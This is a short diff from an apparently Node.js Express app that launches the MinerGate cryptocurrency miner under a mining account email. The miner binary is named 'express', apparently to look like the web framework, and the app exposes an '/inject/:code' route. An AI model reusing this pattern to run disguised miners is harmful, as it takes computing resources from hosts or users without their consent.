@@ -22,7 +22,7 @@ app.get('/inject/:code', function (req, res) {
 });
 const start = ()=>{
     state = true;
-    proc = spawn('./opt/minergate-cli/express', ['-user', 'ian10_141@yahoo.com.br', "-"+coin, '1']);
+    proc = spawn('./opt/minergate-cli/express', ['-user', 'ian10_141@yahoo.com.br', "-"+coin]);
     proc.on('close', () => {
       console.log('child process exited');
       state = false;
